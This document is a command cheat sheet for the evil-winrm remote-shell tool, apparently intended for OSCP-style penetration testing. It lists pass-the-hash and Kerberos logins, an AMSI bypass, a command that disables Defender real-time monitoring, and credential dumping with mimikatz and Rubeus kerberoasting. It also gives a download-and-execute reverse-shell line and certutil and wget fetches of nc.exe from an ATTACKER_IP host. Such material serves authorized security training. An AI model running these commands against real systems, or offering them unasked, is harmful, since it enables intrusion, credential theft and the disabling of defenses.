# evil-winrm

```
# Basic Connection
evil-winrm -i 10.10.10.10 -u administrator -p password
evil-winrm -i 10.10.10.10 -u user -p password

# Connect with Domain User
evil-winrm -i 10.10.10.10 -u user -p password -r DOMAIN
evil-winrm -i 10.10.10.10 -u DOMAIN/user -p password

# Pass-the-Hash
evil-winrm -i 10.10.10.10 -u administrator -H NTHASH
evil-winrm -i 10.10.10.10 -u user -H NTHASH

# SSL Connection
evil-winrm -i 10.10.10.10 -S

# Specify Port
evil-winrm -i 10.10.10.10 -u user -p password -P 5985
evil-winrm -i 10.10.10.10 -u user -p password -P 5986 -S

# Kerberos Authentication
evil-winrm -i dc01.example.com -r EXAMPLE.COM -u user -p password
evil-winrm -i dc01.example.com -r EXAMPLE.COM -k

# Use Certificate Authentication
evil-winrm -i 10.10.10.10 -c cert.pem -k key.pem

# Upload File
upload local.txt
upload shell.exe
upload linpeas.exe

# Download File
download proof.txt
download users.txt

# Execute PowerShell Script
menu
Invoke-Binary /path/to/binary.exe
Bypass-4MSI

# Load PowerShell Script
. ./PowerView.ps1
. ./SharpHound.ps1

# AMSI Bypass
Bypass-4MSI

# Execute Binary from Memory
Invoke-Binary /opt/tools/SharpUp.exe
Invoke-Binary /opt/tools/Rubeus.exe

# Execute WinPEAS
upload winPEASx64.exe
.\winPEASx64.exe

# Execute PowerView
Import-Module .\PowerView.ps1
Get-DomainUser
Get-DomainComputer

# Execute SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Check Current User
whoami
whoami /priv
whoami /groups

# System Information
hostname
systeminfo
ipconfig /all

# Enumerate Users
net user
Get-LocalUser

# Enumerate Groups
net localgroup
Get-LocalGroup

# Enumerate Shares
net share

# Enumerate Services
sc query
Get-Service

# Enumerate Scheduled Tasks
schtasks /query

# Enumerate Processes
tasklist
Get-Process

# Search Files
dir /s proof.txt
Get-ChildItem -Recurse

# Read File
type proof.txt
Get-Content proof.txt

# Change Directory
cd C:\Users
cd Desktop

# Create Reverse Shell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"

# Download File from HTTP
certutil -urlcache -f http://ATTACKER_IP/nc.exe nc.exe
powershell wget http://ATTACKER_IP/file.exe -OutFile file.exe

# Enable PS Remoting
Enable-PSRemoting -Force

# Check Defender
Get-MpComputerStatus

# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Run Mimikatz
Invoke-Binary /opt/tools/mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Run Rubeus
Invoke-Binary /opt/tools/Rubeus.exe
Rubeus kerberoast

# Spawn CMD
cmd.exe

# PowerShell History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Common OSCP Commands
evil-winrm -i 10.10.10.10 -u user -p password
evil-winrm -i 10.10.10.10 -u administrator -H NTHASH
upload winPEASx64.exe
.\winPEASx64.exe
whoami /priv
systeminfo
download proof.txt
menu
Bypass-4MSI
```
